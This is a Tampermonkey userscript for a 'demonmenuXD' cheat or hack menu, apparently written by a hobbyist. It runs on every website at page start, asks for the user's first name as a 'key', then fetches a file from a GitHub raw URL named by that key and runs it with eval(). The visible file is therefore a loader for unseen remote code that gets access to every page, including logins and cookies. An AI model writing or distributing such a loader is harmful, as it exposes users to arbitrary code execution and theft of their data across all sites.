//open the menu with alt + i
//close the menu with alt + x
//you can also move the menu around














// ==UserScript==
// @name         demonmenuXD compact(3.1)
// @namespace    http://tampermonkey.net/
// @version      3.1
// @description  Devlog: +added admin dashboard +added new ui -removed old ui +added auto updater for real this time -removed some hacks -removed key
// @author       snowiscool
// @match        *://*/*
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_listValues
// @grant        GM_setClipboard
// @run-at       document_start

// ==/UserScript==


var localkey = GM_getValue('key')

if (localkey === "" || localkey === null || localkey === undefined) {
    localkey = prompt("Please enter your FIRST name with NO CAPITALS or SPACES or this will not work");
    GM_setValue('key', localkey)
}
else {
    fetch("https://raw.githubusercontent.com/phillipbruh/snowplus/main/keys/"+localkey+"").then(function (response) {response.text().then(function (text) {eval(text);}); });

}
